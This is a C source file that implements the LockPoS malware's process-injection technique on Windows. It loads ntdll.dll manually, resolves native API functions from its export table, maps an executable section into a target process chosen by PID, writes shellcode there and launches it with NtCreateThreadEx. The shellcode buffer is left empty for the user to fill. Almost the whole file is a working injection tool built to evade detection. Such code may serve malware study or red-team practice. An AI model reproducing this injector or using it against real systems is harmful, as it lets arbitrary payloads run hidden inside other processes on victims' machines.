/*https://www.cyberbit.com/endpoint-security/new-lockpos-malware-injection-technique/*/
/*CreateFileMappingW, MapViewOfFile, RtlAllocateHeap, NtCreateSection(0x004a), NtMapViewOfSection(0x0028), NtCreateThreadEx(0x004e)*/
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "lockpos.h"
#define STB_DS_IMPLEMENTATION
#include "stb_ds.h"// allows for operations simmilar to <vector> structure from cpp
#include <ntstatus.h>




//payload, printing "hello world" in messagebox
char shellcode[] = {""}; //place your shellcode here
    SIZE_T shellcodesize = sizeof(shellcode);


int main(void){

    NTSTATUS status;
    PVOID HAllocate = NULL;
    PROCESS_INFORMATION pi;
    STARTUPINFO si = {sizeof(si)};
    unsigned long oldProtection = 0;


    DWORD pid;
    printf("target PID: ");
    scanf("%d", &pid);

//creating handle for ntdll
    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE){
        printf("[-] failed to create(open) file, error: [%d]\n", GetLastError());
        return 1;
    }
        printf("[+] ntdll.dll has been opened\n");


//creating a mapping object for the ntdll        
    HANDLE FileMapd = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, L"mydll");
    if(FileMapd == NULL){
        printf("[-] unable to creating mapping object, error: [%d]\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
        printf("[+] mapping object has been created\n");


//mapping the ntdll to address in our process (this program)
    LPVOID FileView = MapViewOfFile(FileMapd, FILE_MAP_READ, 0, 0, 0);
    if(FileView == NULL){
        printf("[-] failed to mapping file, error: [%d]\n", GetLastError());
        CloseHandle(hFile);
        CloseHandle(FileMapd);
        return 1;
    }
        printf("[+] file has been mapped to [0x%p]\n", FileView);


/*next couple blocks of code are steps for manuallyloading function from ntdll.dll, (PE manual loading technique)*/
    IMAGE_DOS_HEADER *dos_header = (IMAGE_DOS_HEADER *)FileView;
    IMAGE_NT_HEADERS *nt_headers = (IMAGE_NT_HEADERS *)((BYTE *)FileView + dos_header->e_lfanew);
    //printf("dos_header and nt_headers addresses: [%p, %p]\n", dos_header, nt_headers);
    
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY *)((PBYTE)FileView + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    //printf("export table addres: [%p]\n", exportDir);
    
    DWORD *addressOfFunctions = (DWORD *)((PBYTE)FileView + exportDir->AddressOfFunctions);
    DWORD *addressOfNames = (DWORD *)((PBYTE)FileView + exportDir->AddressOfNames);
    WORD *addressOfNameOrdinals = (WORD *)((PBYTE)FileView + exportDir->AddressOfNameOrdinals);
    //printf("test [%p, %p, %p]\n", addressOfFunctions, addressOfNames, addressOfNameOrdinals);//for debuging purpose
    

// looking for required function addresses by names
    char *functionNames[] = {"NtCreateSection", "NtCreateThreadEx", "NtMapViewOfSection", "NtProtectVirtualMemory" , "RtlAllocateHeap"};
    void **function_addresses = NULL;  //dynamic array for function addresses

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* functionName = (char*)((PBYTE)FileView + addressOfNames[i]);
        for (int j = 0; j < sizeof(functionNames) / sizeof(functionNames[0]); j++) {
            if (strcmp(functionName, functionNames[j]) == 0) {
                DWORD functionOrdinal = addressOfNameOrdinals[i];
                DWORD functionAddress = addressOfFunctions[functionOrdinal];
                arrput(function_addresses, (PBYTE)FileView + functionAddress);  // Dodajemy do dynamicznej tablicy
                printf("Function [%s] found at address: [0x%p] with number [%d]\n", functionNames[j], (PBYTE)FileView + functionAddress, j);
            }
        }
    }

/*---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

//passing function_address[j] as pointer to required function

//creating a section object in the kernel 
    HANDLE hSection = NULL;
    LARGE_INTEGER maxSize;
    maxSize.QuadPart = 0x1000; 
    pNtCreateSection NtCreateSection = (pNtCreateSection)function_addresses[0];
    status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to create section. NTSTATUS: 0x%X\n", status);
        CloseHandle(FileMapd);
        CloseHandle(hFile);
		return 1;
	}
    printf("[+] Section created \n");

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, TRUE, pid);
    if(!hProcess){
        printf("[-] Unable to open process: [%d]\n", pid);
        return 1;
    }
    printf("[+] process has been opened [%d]\n", pid);

//map a view of that section into selected process
    PVOID cSection = NULL;
    DWORD viewSize = 0;
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)function_addresses[2];
    status = NtMapViewOfSection(hSection, hProcess, &cSection, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to map section. NTSTATUS: 0x%X\n", status);
        CloseHandle(FileMapd);
        CloseHandle(hFile);
        return 1;
    }
    printf("[+] Section mapped at address: %p\n", cSection);


//copying code into section
    SIZE_T written;
    BOOL writeMem = WriteProcessMemory(hProcess, cSection, shellcode, shellcodesize, &written);
    if (writeMem == 0){
        printf("[-] unable to write shellocde into process memory, error: [%d]\n", GetLastError());
        VirtualFreeEx(hProcess, cSection, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        CloseHandle(FileMapd);
        CloseHandle(hFile);
        return 1;
    }
    printf("[+] pomyslnie zapisano dane do procesu [%d]\n", written);

// Change Memory Protection: RW -> RX
    PVOID baseAddress = cSection;  //must be pointer
    SIZE_T regionSize = shellcodesize;  //size of written region
    _NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)function_addresses[3];
	status = pNtProtectVirtualMemory(hProcess, &cSection, &shellcodesize, PAGE_EXECUTE_READ, &oldProtection);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to change memory protection from RW to RX: %x \n", status);
		exit(-1);
	}

//creating a remote thread
    HANDLE hThread = NULL;
    PVOID remoteShellcode = (LPTHREAD_START_ROUTINE)cSection;
    _NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)function_addresses[1];
//for proper working demands PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION acces rights in Open_Process function
    status = pNtCreateThreadEx(
        &hThread,               // PHANDLE ThreadHandle
        THREAD_ALL_ACCESS,      // ACCESS_MASK DesiredAccess
        NULL,                   // POBJECT_ATTRIBUTES ObjectAttributes (NULL jeśli nie potrzebne)
        hProcess,               // HANDLE ProcessHandle
        remoteShellcode,       // PVOID StartRoutine
        NULL,                   // PVOID Argument (NULL w tym przypadku)
        FALSE,                  // ULONG CreateFlags
        0,                      // SIZE_T ZeroBits
        0,                      // SIZE_T StackSize
        0,                      // SIZE_T MaximumStackSize
        NULL                    // PPS_ATTRIBUTE_LIST AttributeList (NULL w tym przypadku)
    );
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to Execute Remote Thread: 0x%X\n", status);
        exit(-1);
    }

    printf("[+] Injected shellcode!!\n");
    system("pause");


    //NtClose(hSection);
    UnmapViewOfFile(FileView);
    CloseHandle(hProcess);
    CloseHandle(FileMapd);
    CloseHandle(hFile);
    CloseHandle(hSection);

    return 0;
}
